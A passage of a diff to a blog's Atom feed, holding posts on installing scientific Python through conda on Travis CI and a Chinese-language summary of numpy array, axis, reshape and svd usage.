+  &lt;span class="c1"&gt;# We don&amp;#39;t actually use the Travis Python, but this keeps it organized.&lt;/span&gt;
+  - &lt;span class="s2"&gt;&amp;quot;3.5&amp;quot;&lt;/span&gt;
+
+install:
+  - sudo …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;It takes long time to install scientific python package by &lt;code&gt;pip&lt;/code&gt; in travis and sometime fail.&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;The solve is to use conda to install binary package. &lt;br&gt;
+&lt;a href="http://conda.pydata.org/docs/travis.html"&gt;http://conda.pydata.org/docs/travis.html&lt;/a&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;Note that some package not in conda, you can use &lt;code&gt;pip&lt;/code&gt; install it, for example, &lt;code&gt;py.test&lt;/code&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;Here is my &lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESL-Model&lt;/a&gt; .trais.yml, you can view on github &lt;a href="https://github.com/littlezz/ESL-Model/blob/master/.travis.yml"&gt;https://github.com/littlezz/ESL-Model/blob/master/.travis.yml&lt;/a&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;language: python
 python:
   &lt;span class="c1"&gt;# We don&amp;#39;t actually use the Travis Python, but this keeps it organized.&lt;/span&gt;
   - &lt;span class="s2"&gt;&amp;quot;3.5&amp;quot;&lt;/span&gt;
@@ -490,22 +767,26 @@ install:
 script:
   - py.test
 
-
 notifications:
   email:
     on_success: never
     on_failure: always
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-Note that you should install pytest manually instead use pre-install one.&lt;/p&gt;
-&lt;p&gt;However, you can not use tox with conda direct, try ctox &lt;a href="https://github.com/hayd/ctox"&gt;https://github.com/hayd/ctox&lt;/a&gt;  &lt;/p&gt;
-&lt;p&gt;2016-03-31 16:19:38&lt;/p&gt;</summary><category term="python"></category><category term="numpy"></category><category term="小结"></category></entry><entry><title>Numpy 使用小结</title><link href="http://littlezz.github.io/numpy-shi-yong-xiao-jie.html" rel="alternate"></link><updated>2016-03-26T11:12:24+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-21:numpy-shi-yong-xiao-jie.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESLModel&lt;/a&gt; 开发有一段时间了， 期间和numpy打了非常多的交道， 虐得我死去活来。  &lt;/p&gt;
-&lt;p&gt;于是抽空写一下关于numpy的总结吧。  &lt;/p&gt;
-&lt;h2 id="intro"&gt;&lt;a name="user-content-intro" href="#intro" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Intro&lt;/h2&gt;
+
+
+&lt;p&gt;Note that you should install pytest manually instead use pre-install one.&lt;/p&gt;
+&lt;p&gt;However, you can not use tox with conda direct, try ctox &lt;a href="https://github.com/hayd/ctox"&gt;https://github.com/hayd/ctox&lt;/a&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;2016-03-31 16:19:38&lt;/p&gt;</content><category term="python"></category><category term="numpy"></category><category term="小结"></category></entry><entry><title>Numpy 使用小结</title><link href="http://littlezz.github.io/numpy-shi-yong-xiao-jie.html" rel="alternate"></link><published>2016-03-21T00:00:00+08:00</published><updated>2016-03-26T11:12:24+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-21:/numpy-shi-yong-xiao-jie.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESLModel&lt;/a&gt; 开发有一段时间了， 期间和numpy打了非常多的交道， 虐得我死去活来。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;于是抽空写一下关于numpy的总结吧。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;Intro&lt;/h2&gt;
 &lt;p&gt;介绍一些会混淆的东西&lt;/p&gt;
-&lt;h3 id="vector-vs-matrix"&gt;&lt;a name="user-content-vector-vs-matrix" href="#vector-vs-matrix" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;vector vs matrix&lt;/h3&gt;
-&lt;p&gt;vector是向量， 是一维的。 &lt;br /&gt;
-matrix是二维以上的。  &lt;/p&gt;
+&lt;h3&gt;vector vs matrix&lt;/h3&gt;
+&lt;p&gt;vector是向量， 是一维的。 
+matrix是二维以上的。&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;vec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
 
 &lt;span class="c1"&gt;# method 1&lt;/span&gt;
@@ -529,9 +810,61 @@ matrix是二维以上的。  &lt;/p&gt;
 &lt;li&gt;向量可以点乘矩阵， 反过来也可以， 结果是向量。&lt;/li&gt;
 &lt;li&gt;向量可以点乘向量， 得到标量&lt;/li&gt;
 &lt;li&gt;向量没有倒置&lt;/li&gt;
-&lt;li&gt;矩阵使用下标的时候， 结果是向量， 使用slice 来查询的时候， 得到子矩阵。  &lt;/li&gt;
+&lt;li&gt;矩阵使用下标的时候， 结果是向量， 使用slice 来查询的时候， 得到子矩阵。&lt;br&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;如果想要得到  单行的子矩阵  &lt;/p&gt;
+&lt;p&gt;如果想要得到  单行的子矩阵&lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="c1"&gt;# 得到一行， 矩阵&lt;/span&gt;
+&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;:]&lt;/span&gt;
+
+&lt;span class="c1"&gt;# 得到一列， 矩阵&lt;/span&gt;
+&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[:,[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;
+
+&lt;span class="c1"&gt;# 得到第二列， 向量&lt;/span&gt;
+&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="c1"&gt;# 子矩阵&lt;/span&gt;
+&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;2 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESLModel&lt;/a&gt; 开发有一段时间了， 期间和numpy打了非常多的交道， 虐得我死去活来。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;于是抽空写一下关于numpy的总结吧。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;Intro&lt;/h2&gt;
+&lt;p&gt;介绍一些会混淆的东西&lt;/p&gt;
+&lt;h3&gt;vector vs matrix&lt;/h3&gt;
+&lt;p&gt;vector是向量， 是一维的。 
+matrix是二维以上的。&lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;vec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+
+&lt;span class="c1"&gt;# method 1&lt;/span&gt;
+&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;([[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;
+
+&lt;span class="c1"&gt;# method 2&lt;/span&gt;
+&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;vec&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="c1"&gt;# mathod 3&lt;/span&gt;
+&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vec&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="c1"&gt;# output (3,)&lt;/span&gt;
+
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="c1"&gt;# output (3, 1)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ol&gt;
+&lt;li&gt;向量可以点乘矩阵， 反过来也可以， 结果是向量。&lt;/li&gt;
+&lt;li&gt;向量可以点乘向量， 得到标量&lt;/li&gt;
+&lt;li&gt;向量没有倒置&lt;/li&gt;
+&lt;li&gt;矩阵使用下标的时候， 结果是向量， 使用slice 来查询的时候， 得到子矩阵。&lt;br&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;如果想要得到  单行的子矩阵&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 
 &lt;span class="c1"&gt;# 得到一行， 矩阵&lt;/span&gt;
@@ -551,35 +884,39 @@ matrix是二维以上的。  &lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id="axis1-vs-axis0"&gt;&lt;a name="user-content-axis1-vs-axis0" href="#axis1-vs-axis0" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;axis=1 vs axis=0&lt;/h3&gt;
-&lt;p&gt;之前看官方的文档里面有说， 你要这样记：axis=0 是从上往下， axis=1 是从左往右处理。  &lt;/p&gt;
-&lt;p&gt;比如&lt;code&gt;np.sum(mat, axis=0)&lt;/code&gt; 得到每一列从上到下的累加和. &lt;code&gt;axis=1&lt;/code&gt; 的时候得到每一行的累加和.  &lt;/p&gt;
+&lt;h3&gt;axis=1 vs axis=0&lt;/h3&gt;
+&lt;p&gt;之前看官方的文档里面有说， 你要这样记：axis=0 是从上往下， axis=1 是从左往右处理。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;比如&lt;code&gt;np.sum(mat, axis=0)&lt;/code&gt; 得到每一列从上到下的累加和. &lt;code&gt;axis=1&lt;/code&gt; 的时候得到每一行的累加和.&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;m2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;axis&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
 
 &lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;65&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
 &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h4 id="rowvar1"&gt;&lt;a name="user-content-rowvar1" href="#rowvar1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;rowvar=1&lt;/h4&gt;
-&lt;p&gt;在使用&lt;code&gt;np.cov&lt;/code&gt; 的时候，里面有这个参数， 默认是非零， 表示你的矩阵是（p x N）的， 每一行表示变量， 每一列里面存的是样本数据。  如果&lt;code&gt;rowvar=0&lt;/code&gt;, 则表示反过来.  &lt;/p&gt;
-&lt;h2 id="tips"&gt;&lt;a name="user-content-tips" href="#tips" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Tips&lt;/h2&gt;
-&lt;h3 id="reshape"&gt;&lt;a name="user-content-reshape" href="#reshape" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;reshape&lt;/h3&gt;
+&lt;h4&gt;rowvar=1&lt;/h4&gt;
+&lt;p&gt;在使用&lt;code&gt;np.cov&lt;/code&gt; 的时候，里面有这个参数， 默认是非零， 表示你的矩阵是（p x N）的， 每一行表示变量， 每一列里面存的是样本数据。  如果&lt;code&gt;rowvar=0&lt;/code&gt;, 则表示反过来.&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;Tips&lt;/h2&gt;
+&lt;h3&gt;reshape&lt;/h3&gt;
 &lt;p&gt;reshape 里面的值设置-1的时候表示自动&lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-会自动变成(3x4)  &lt;/p&gt;
-&lt;h3 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;如何插入一列&lt;/h3&gt;
+
+
+&lt;p&gt;会自动变成(3x4)&lt;br&gt;
+&lt;/p&gt;
+&lt;h3&gt;如何插入一列&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;span class="c1"&gt;# 在0的开始插入全为3的列&lt;/span&gt;
 &lt;span class="n"&gt;b1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;axis&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id="_2"&gt;&lt;a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;如何把向量转成单列矩阵&lt;/h3&gt;
+&lt;h3&gt;如何把向量转成单列矩阵&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# column matrix&lt;/span&gt;
 &lt;span class="n"&gt;vec&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 
@@ -588,13 +925,13 @@ matrix是二维以上的。  &lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id="a"&gt;&lt;a name="user-content-a" href="#a" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;如何算矩阵的行列式&lt;span class="math"&gt;\(|A|\)&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;用&lt;code&gt;np.linalg.det&lt;/code&gt; 或者 &lt;code&gt;np.linalg.slogdet&lt;/code&gt;&lt;br /&gt;
+&lt;h3&gt;如何算矩阵的行列式$|A|$&lt;/h3&gt;
+&lt;p&gt;用&lt;code&gt;np.linalg.det&lt;/code&gt; 或者 &lt;code&gt;np.linalg.slogdet&lt;/code&gt;
 后者在矩阵里面的值很小的时候使用, 得到的是log后的结果.&lt;/p&gt;
-&lt;h3 id="ddof"&gt;&lt;a name="user-content-ddof" href="#ddof" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;ddof&lt;/h3&gt;
+&lt;h3&gt;ddof&lt;/h3&gt;
 &lt;p&gt;在&lt;code&gt;np.std&lt;/code&gt;等函数中有&lt;code&gt;ddof&lt;/code&gt;这个参数， 默认为0， 在pandas里面默认为1， 主要用于控制比如计算标准差的时候， 是除以N-1还是除以N， 这里相当于除以（N - ddof）&lt;/p&gt;
-&lt;h3 id="svd"&gt;&lt;a name="user-content-svd" href="#svd" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;svd&lt;/h3&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Vt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;linalg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;svd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;h3&gt;svd&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Vt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;linalg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;svd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Vt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="c1"&gt;# output(4, 4) (3,) (3, 3) (4, 3)&lt;/span&gt;
 
@@ -603,16 +940,17 @@ matrix是二维以上的。  &lt;/p&gt;
 &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Vt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="c1"&gt;# output (4, 3) (3,) (3, 3) (4, 3)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-注意到D是向量， Vt是V的转置矩阵。&lt;br /&gt;
+
+
+&lt;p&gt;注意到D是向量， Vt是V的转置矩阵。
 多数情况下， 应该是使用full_matrices=False&lt;/p&gt;
-&lt;h3 id="_3"&gt;&lt;a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;随机整数矩阵&lt;/h3&gt;
+&lt;h3&gt;随机整数矩阵&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 随机生成包含0-9的 4x3 的矩阵&lt;/span&gt;
